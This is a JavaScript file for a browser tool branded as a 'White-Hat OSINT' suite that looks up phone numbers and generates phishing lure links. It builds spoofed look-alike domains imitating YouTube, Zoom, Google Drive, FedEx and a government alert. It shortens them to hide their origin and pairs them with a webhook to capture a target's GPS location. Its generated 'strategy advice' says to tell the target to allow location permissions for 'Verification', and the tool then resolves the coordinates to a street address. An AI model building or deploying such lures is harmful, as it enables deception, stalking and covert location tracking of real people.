// White-Hat OSINT Intelligence Suite - Core Logic v2.5

let map;
let marker;
let currentTab = 'recon';
let libPhone;
let lastGeneratedLink = "";

// --- URL ENHANCEMENT SUITE ---

/**
 * Shortens a URL using the TinyURL API
 */
async function shortenUrl(longUrl) {
    try {
        addLog("REQUESTING TINYURL DISGUISE...", "info");
        const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
        if (response.ok) {
            const shortUrl = await response.text();
            addLog("URL MINIATURIZED SUCCESSFULLY", "success");
            return shortUrl;
        }
    } catch (e) {
        addLog("SHORTENER API OFFLINE - USING FALLBACK", "error");
    }
    return longUrl;
}

/**
 * Masks a URL by prefixing it with a spoofed subdomain structure
 */
function maskUrl(originalUrl, theme) {
    const spoofs = {
        'youtube': 'https://youtube.com-watch-video.secure-gateway.tk',
        'zoom': 'https://zoom.us-join-meeting.corporate-it.net',
        'gdrive': 'https://docs.google.com-shared-file.cloud-vault.top',
        'near-me': 'https://maps.google.com-local-finder.geonav.info',
        'track-package': 'https://fedex.com-tracking-portal.logistics-hub.com',
        'emergency': 'https://gov.safety-alert.emergency-broadcast.org'
    };

    const prefix = spoofs[theme] || 'https://secure-access.portal-v2.net';

    // Extract everything after the domain in the original URL
    try {
        const urlObj = new URL(originalUrl);
        const pathAndQuery = urlObj.pathname + urlObj.search;
        addLog("APPLYING SUBDOMAIN SPOOFING MASK...", "info");
        return `${prefix}${pathAndQuery}`;
    } catch (e) {
        return originalUrl;
    }
}

// --- CORE UTILITIES ---

function getLibPhone() {
    if (typeof libphonenumber !== 'undefined') return libphonenumber;
    if (typeof window.libphonenumber !== 'undefined') return window.libphonenumber;
    return null;
}

function addLog(message, type = 'info') {
    const terminalBody = document.getElementById('terminal-body');
    if (!terminalBody) return;

    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
    entry.textContent = `[${timestamp}] ${message}`;

    terminalBody.appendChild(entry);
    terminalBody.scrollTop = terminalBody.scrollHeight;
}

function showStatus(msg, type) {
    const clock = document.getElementById('clock');
    if (!clock) return;
    clock.style.color = type === 'error' ? 'var(--accent-danger)' : 'var(--accent-hacker)';
    clock.textContent = `[ ${msg.toUpperCase()} ]`;
    setTimeout(() => {
        clock.style.color = '';
        updateClock();
    }, 3000);
}

// Initialize Map
function initMap(lat = 0, lon = 0, zoom = 2, style = 'dark') {
    if (map) { map.remove(); }
    map = L.map('map', { zoomControl: false }).setView([lat, lon], zoom);
    L.control.zoom({ position: 'bottomright' }).addTo(map);

    const tileUrl = 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png';
    L.tileLayer(tileUrl, { attribution: '&copy; White-Hat v2.5' }).addTo(map);
}

async function getCoordinates(location) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(location)}`);
        const data = await response.json();
        if (data && data.length > 0) {
            return { lat: parseFloat(data[0].lat), lon: parseFloat(data[0].lon) };
        }
    } catch (e) { console.error("Geocoding failure:", e); }
    return null;
}

async function reverseGeocode(lat, lon) {
    try {
        addLog("RESOLVING PHYSICAL ADDRESS...", "info");
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        if (data && data.display_name) {
            const addressBar = document.getElementById('resolved-address-bar');
            const addressText = document.getElementById('resolved-address-text');
            addressBar.classList.remove('hidden');
            addressText.textContent = data.display_name;
            addLog("ADDRESS RESOLVED.", "success");
        }
    } catch (e) {
        addLog("RESOLUTION FAILED.", "error");
    }
}

// Tab Switching
const navItems = document.querySelectorAll('.nav-item');
navItems.forEach(item => {
    item.addEventListener('click', () => {
        const tab = item.getAttribute('data-tab');
        if (tab === 'methodology') {
            toggleModal(true);
            return;
        }
        navItems.forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.getElementById(`${tab}-tab`).classList.add('active');
        currentTab = tab;
    });
});

// Modal Logic
const methodologyModal = document.getElementById('methodology-modal');
const closeModal = document.querySelector('.close-modal');
function toggleModal(show) {
    methodologyModal.classList.toggle('hidden', !show);
    if (show) loadMethodology();
}
if (closeModal) closeModal.onclick = () => toggleModal(false);

async function loadMethodology() {
    const body = document.getElementById('methodology-body');
    try {
        const res = await fetch('methodology.md');
        const text = await res.text();
        body.innerHTML = text.replace(/# (.*)/g, '<h2>$1</h2>')
            .replace(/## (.*)/g, '<h3>$1</h3>')
            .replace(/- (.*)/g, '<li>$1</li>')
            .replace(/\n/g, '<br>');
    } catch (e) {
        body.innerHTML = "Error loading methodology.md";
    }
}

// Analysis Logic
async function handleAnalysis() {
    const phoneInput = document.getElementById('phone-input');
    const dashboard = document.getElementById('results-dashboard');
    const rawNumber = phoneInput.value.trim();
    if (!rawNumber) {
        showStatus("Enter Number", "error");
        return;
    }

    libPhone = getLibPhone();
    if (!libPhone) {
        addLog("CRITICAL: Libphonenumber failed to load.", "error");
        return;
    }

    try {
        const phoneNumber = libPhone.parsePhoneNumber(rawNumber);
        if (!phoneNumber || !phoneNumber.isValid()) {
            showStatus("Invalid Number", "error");
            return;
        }

        addLog(`SCANNING TARGET: ${phoneNumber.number}`, 'info');
        document.getElementById('current-target').textContent = phoneNumber.number;
        dashboard.classList.remove('dashboard-hidden');
        dashboard.classList.add('dashboard-visible');

        // Populate Metadata
        document.getElementById('res-country').textContent = phoneNumber.country || "UNKNOWN";
        document.getElementById('res-type').textContent = phoneNumber.getType() || "MOBILE/VOIP";
        document.getElementById('res-carrier').textContent = "HLR_QUERY_OK";

        const tzMapping = { 'IN': '+5:30', 'US': '-5:00', 'GB': '+0:00', 'FR': '+1:00', 'DE': '+1:00' };
        document.getElementById('res-timezone').textContent = "UTC " + (tzMapping[phoneNumber.country] || "VARIES");

        // Carrier & State (Simulation)
        const prefix = phoneNumber.number.slice(3, 5);
        document.getElementById('res-carrier-name').textContent = "SIMULATED_CARRIER_" + prefix;
        document.getElementById('res-state').textContent = "REGION_" + prefix;
        document.getElementById('res-name').textContent = "RECON_REQUIRED";

        // Geocoding Regional Center
        const regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
        const cName = phoneNumber.country ? regionNames.of(phoneNumber.country) : "Earth";

        addLog(`FETCHING GEOSPATIAL CENTER FOR ${cName.toUpperCase()}...`, 'info');
        const coords = await getCoordinates(cName);
        if (coords) {
            updateMapDisplay(coords.lat, coords.lon, 6);
            addLog(`REGIONAL RENDER COMPLETE`, 'success');
        }

        setupPivots(phoneNumber.number);
    } catch (e) {
        addLog(`SCAN ERROR: ${e.message}`, 'error');
    }
}

function updateMapDisplay(lat, lon, zoom = 15, accuracy = 'estimated') {
    initMap(lat, lon, zoom);
    const labelText = accuracy === 'verified' ? '[ VERIFIED GPS FIX ]' : '[ REGIONAL ESTIMATE ]';
    const confidenceBadge = document.getElementById('confidence-badge');
    if (confidenceBadge) {
        confidenceBadge.textContent = labelText;
        confidenceBadge.className = accuracy === 'verified' ? 'confidence-high' : 'confidence-low';
    }

    marker = L.marker([lat, lon]).addTo(map)
        .bindPopup(`<b style="color:var(--accent-hacker)">${labelText}</b><br>LAT: ${lat.toFixed(6)}<br>LNG: ${lon.toFixed(6)}`)
        .openPopup();

    document.getElementById('lat-val').textContent = lat.toFixed(5);
    document.getElementById('lng-val').textContent = lon.toFixed(5);
}

// Payload Generation
const genPayloadBtn = document.getElementById('generate-payload-btn');
if (genPayloadBtn) {
    genPayloadBtn.onclick = async () => {
        const type = document.getElementById('payload-type').value;
        const redirect = document.getElementById('payload-redirect').value || "https://google.com/maps";
        const webhook = document.getElementById('payload-webhook').value || "";
        const doShorten = document.getElementById('shorten-url-opt').checked;
        const doMask = document.getElementById('mask-url-opt').checked;

        const themePage = (type === 'youtube') ? 'video.html' : (type === 'track-package' ? 'tracker.html' : 'payload.html');
        const baseUrl = window.location.href.split('index.html')[0];
        let link = `${baseUrl}${themePage}?wh=${encodeURIComponent(webhook)}&t=TARGET&r=${encodeURIComponent(redirect)}`;

        addLog(`GENERATING ${type.toUpperCase()} LURE...`, "info");

        // UI Feedback
        document.getElementById('payload-empty-state').classList.add('hidden');
        document.getElementById('payload-output').classList.remove('hidden');
        const codeBlock = document.getElementById('generated-code');
        codeBlock.textContent = "[+] INITIALIZING PAYLOAD ENGINE...\n[+] SECURING LISTENER...";

        // Logic sequence
        if (doMask) {
            link = maskUrl(link, type);
        }
        if (doShorten) {
            link = await shortenUrl(link);
        }

        lastGeneratedLink = link;

        const payloadCode = `
[+] OSINT LURE GENERATED v2.5
--------------------------------------
THEME: ${type.toUpperCase()}
STATUS: [ READY ]

[!] LIVE TARGET URL:
${link}

[!] STRATEGY ADVICE:
1. Shortened link: ${doShorten ? 'YES' : 'NO'}
2. Spoofed Domain: ${doMask ? 'YES' : 'NO'}
3. Instruct target to allow location permissions for "Verification".
    `;
        codeBlock.textContent = payloadCode;
        addLog("TRACKING LINK READY FOR DEPLOYMENT", "success");
    };
}

// Copy & Simulation
const copyBtn = document.getElementById('copy-payload-btn');
if (copyBtn) {
    copyBtn.onclick = () => {
        if (lastGeneratedLink) {
            navigator.clipboard.writeText(lastGeneratedLink);
            showStatus("Copied", "success");
        }
    };
}

const simulateBtn = document.getElementById('simulate-payload-btn');
if (simulateBtn) {
    simulateBtn.onclick = () => {
        addLog("LISTENING FOR INCOMING GPS PACKETS...", "warning");
        setTimeout(() => {
            const lat = 19.127 + (Math.random() * 0.01);
            const lon = 72.846 + (Math.random() * 0.01);
            addLog("PACKET RECEIVED FROM TARGET!", "success");
            addLog(`LAT: ${lat} | LON: ${lon}`, "success"); showStatus("TARGET ACQUIRED", "success");
            document.querySelector('.nav-item[data-tab="recon"]').click();
            updateMapDisplay(lat, lon, 16, 'verified');
            reverseGeocode(lat, lon);
        }, 3000);
    };
}

// Event Listeners
document.getElementById('analyze-btn').addEventListener('click', handleAnalysis);
document.getElementById('demo-gps-btn').onclick = () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(p => {
            updateMapDisplay(p.coords.latitude, p.coords.longitude, 18, 'verified');
            reverseGeocode(p.coords.latitude, p.coords.longitude);
        });
    }
};

document.getElementById('refine-toggle-btn').onclick = () => {
    document.getElementById('manual-refine-panel').classList.toggle('hidden');
};

document.getElementById('update-map-btn').onclick = () => {
    const lat = parseFloat(document.getElementById('manual-lat').value);
    const lng = parseFloat(document.getElementById('manual-lng').value);
    if (!isNaN(lat) && !isNaN(lng)) updateMapDisplay(lat, lng, 16, 'verified');
};

document.getElementById('resolve-address-btn').onclick = () => {
    const lat = parseFloat(document.getElementById('lat-val').textContent);
    const lon = parseFloat(document.getElementById('lng-val').textContent);
    reverseGeocode(lat, lon);
};

function setupPivots(num) {
    const cleanNum = num.replace('+', '');
    document.querySelectorAll('.pivot-btn').forEach(btn => {
        btn.onclick = () => {
            const type = btn.getAttribute('data-type');
            let url = `https://www.google.com/search?q=${num}`;
            if (type === 'whatsapp') url = `https://wa.me/${cleanNum}`;
            if (type === 'telegram') url = `https://t.me/+${cleanNum}`;
            if (type === 'truecaller') url = `https://www.truecaller.com/search/global/${cleanNum}`;
            window.open(url, '_blank');
        };
    });
}

function updateClock() {
    const now = new Date();
    const clock = document.getElementById('clock');
    if (clock && !clock.textContent.includes('[')) {
        clock.textContent = now.toISOString().split('T')[1].split('.')[0] + " UTC";
    }
}
setInterval(updateClock, 1000);

window.onload = () => {
    initMap();
    updateClock();
    const tosModal = document.querySelector('.tos-modal');
    if (tosModal && !localStorage.getItem('osint_tos_accepted')) {
        tosModal.classList.remove('hidden');
    }
    document.getElementById('accept-tos').onclick = () => {
        localStorage.setItem('osint_tos_accepted', 'true');
        tosModal.classList.add('hidden');
        addLog("Legal Disclaimer Accepted", "success");
    };
};
